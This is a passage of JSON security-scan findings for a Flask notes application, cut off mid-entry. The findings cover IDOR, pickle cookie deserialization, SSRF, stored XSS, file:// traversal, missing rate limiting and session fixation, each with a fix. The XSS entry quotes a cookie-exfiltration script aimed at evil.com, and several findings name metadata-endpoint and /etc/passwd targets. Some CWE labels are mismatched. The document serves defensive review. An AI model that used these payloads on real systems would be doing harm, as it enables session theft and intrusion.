    {
      "check_id": "CWE-22",
      "path": "routes/account.py",
      "start": {
        "line": 98,
        "col": 1
      },
      "end": {
        "line": 98,
        "col": 100
      },
      "extra": {
        "message": "IDOR - Unauthorized Access to Other Users' Personal Notes\n\nThe get_personal_notes endpoint accepts a user_id path parameter and returns all notes for that user without verifying that the authenticated user is authorized to view them. Any authenticated user can access any other user's notes by changing the user_id in the URL.\n\nImpact: Any authenticated user can enumerate user IDs and view all notes (including private ones) belonging to any other user, leading to unauthorized data access and PII exposure.\n\nFix: Add an authorization check to verify that user_id == current_user.id (or that the current user is an admin) before returning the notes.",
        "severity": "HIGH",
        "metadata": {
          "cwe": [
            "CWE-22"
          ],
          "finding_id": "b9df427d-4f63-44cf-8e2b-c48028fdcda4"
        }
      }
    },
    {
      "check_id": "CWE-94",
      "path": "routes/account.py",
      "start": {
        "line": 118,
        "col": 1
      },
      "end": {
        "line": 118,
        "col": 100
      },
      "extra": {
        "message": "Insecure Pickle Deserialization of Cookie Data\n\nThe before_request handler deserializes the 'preferences' cookie using pickle.loads(b64decode(preferences)). Since cookies are user-controlled, an attacker can craft a malicious pickle payload to achieve arbitrary code execution.\n\nImpact: An attacker can craft a malicious pickle payload, base64-encode it, and set it as the 'preferences' cookie. When the server deserializes it, arbitrary Python code executes, leading to full remote code execution and server compromise.\n\nFix: Replace pickle serialization with JSON (json.loads/json.dumps) for cookie data, or use Flask's signed session cookies which include HMAC verification. Never deserialize untrusted data with pickle.",
        "severity": "HIGH",
        "metadata": {
          "cwe": [
            "CWE-94"
          ],
          "finding_id": "9f67702a-8f45-4a43-96d2-5cc6732c7d6a"
        }
      }
    },
    {
      "check_id": "CWE-918",
      "path": "routes/account.py",
      "start": {
        "line": 60,
        "col": 1
      },
      "end": {
        "line": 60,
        "col": 100
      },
      "extra": {
        "message": "SSRF via Profile Image URL Fetch\n\nThe add_image endpoint passes a user-controlled URL (form.url.data) to get_base64_image_blob(), which calls urlopen() to fetch the URL. There is no validation to prevent requests to internal services, cloud metadata endpoints (e.g., http://169.254.169.254/), or other internal resources.\n\nImpact: An attacker can make the server fetch internal resources, access cloud metadata services, scan internal networks, and potentially exfiltrate sensitive data.\n\nFix: Validate and restrict the URL to allowed domains/schemes. Block requests to private IP ranges (10.x, 172.16-31.x, 192.168.x, 169.254.x, 127.x, ::1). Use an allowlist of permitted schemes (http, https only).",
        "severity": "HIGH",
        "metadata": {
          "cwe": [
            "CWE-918"
          ],
          "finding_id": "21c1e05c-e1d3-442e-ae30-737c6b93d50e"
        }
      }
    },
    {
      "check_id": "CWE-79",
      "path": "templates/home.html",
      "start": {
        "line": 36,
        "col": 1
      },
      "end": {
        "line": 36,
        "col": 100
      },
      "extra": {
        "message": "Stored XSS via Note Text with |safe Filter\n\nThe note text is rendered with the |safe Jinja2 filter, which disables HTML escaping. Since note text comes from a CKEditor rich text field, an attacker can inject arbitrary JavaScript that will execute in other users' browsers when they view shared (non-private) notes.\n\nImpact: An attacker can create a note with malicious JavaScript (e.g., <script>document.location='http://evil.com/?c='+document.cookie</script>) that executes in the browsers of all users who view the home page, enabling session hijacking, account takeover, and data theft.\n\nFix: Sanitize HTML content server-side using a library like bleach before storing or rendering it. Only allow a whitelist of safe HTML tags and attributes. Do not use the |safe filter on user-controlled content without sanitization.",
        "severity": "HIGH",
        "metadata": {
          "cwe": [
            "CWE-79"
          ],
          "finding_id": "d77da0e5-7bff-4cfd-acd4-9c8109bbd604"
        }
      }
    },
    {
      "check_id": "CWE-22",
      "path": "utils/profile_image.py",
      "start": {
        "line": 7,
        "col": 1
      },
      "end": {
        "line": 7,
        "col": 100
      },
      "extra": {
        "message": "Path Traversal via SSRF in Profile Image URL\n\nThe download function uses urlopen() with a user-supplied URL without any validation or restriction. The urlopen function supports file:// protocol, allowing an attacker to read arbitrary local files from the server (e.g., file:///etc/passwd).\n\nImpact: An attacker can use file:// URLs to read arbitrary files from the server filesystem, including /etc/passwd, application source code, database files, and configuration files containing secrets.\n\nFix: Validate and restrict the URL scheme to only http:// and https://. Implement an allowlist of domains or block internal/private IP ranges. Use a dedicated HTTP client library with proper restrictions.",
        "severity": "HIGH",
        "metadata": {
          "cwe": [
            "CWE-22"
          ],
          "finding_id": "5acc08a7-5157-441a-9feb-4909db2fcb7e"
        }
      }
    },
    {
      "check_id": "CWE-307",
      "path": "routes/login.py",
      "start": {
        "line": 22,
        "col": 1
      },
      "end": {
        "line": 22,
        "col": 100
      },
      "extra": {
        "message": "Missing Rate Limiting on Login Endpoint\n\nThe do_login() handler at POST /login has no rate limiting, allowing unlimited login attempts. This enables brute-force attacks against user credentials.\n\nImpact: An attacker can perform unlimited brute-force login attempts to guess user passwords.\n\nFix: Implement rate limiting on the login endpoint using Flask-Limiter or similar middleware.",
        "severity": "HIGH",
        "metadata": {
          "cwe": [
            "CWE-307"
          ],
          "finding_id": "f725aa32-b166-4692-a801-08f6585e338d"
        }
      }
    },
    {
      "check_id": "CWE-384",
      "path": "routes/login.py",
      "start": {
        "line": 23,
        "col": 1
      },
      "end": {
        "line": 23,
        "col": 100
      },
      "extra": {
        "message": "Session Fixation - No Session Regeneration on Login\n\nThe do_login() handler authenticates the user and calls login_user() but never regenerates the session ID. Flask's default session handling does not automatically regenerate the session ID upon login. An attacker who can set or know a victim's session ID before login can hijack the session after authentication.\n\nImpact: An attacker can fixate a session ID on a victim's browser, then hijack the authenticated session after the victim logs in.\n\nFix: Regenerate the session after successful authentication by calling session.regenerate() or clearing and recreating the Flask session (e.g., session.clear() before login_user()).",
        "severity": "HIGH",
        "metadata": {
          "cwe": [
            "CWE-384"
          ],
          "finding_id": "a596dea0-b717-4485-9a4d-22c5798b132c"
        }
      }
    },
    {
      "check_id": "CWE-22",
      "path": "routes/notes.py",
      "start": {
        "line": 39,
        "col": 1
      },
      "end": {
        "line": 39,
        "col": 100
      },
      "extra": {
        "message": "Note Deletion Without Ownership Check (IDOR)\n\nThe delete_note endpoint allows any authenticated user to delete any note by ID without verifying that the note belongs to the current user. While the template only shows delete buttons for owned notes, the server-side endpoint lacks authorization checks.\n\nImpact: Any authenticated user can delete any other user's notes by sending a POST request with an arbitrary note_id, leading to unauthorized data destruction.\n\nFix: Add an authorization check: verify that note.user_id == current_user.id (or current_user.is_admin) before deleting the note.",
        "severity": "HIGH",
        "metadata": {
          "cwe": [
            "CWE-22"
          ],
          "finding_id": "a29beb4d-eef8-47a2-9ddc-b055a7a44e05"
        }
      }
    },
    {
      "check_id": "CWE-307",
      "path": "routes/signup.py",
      "start": {
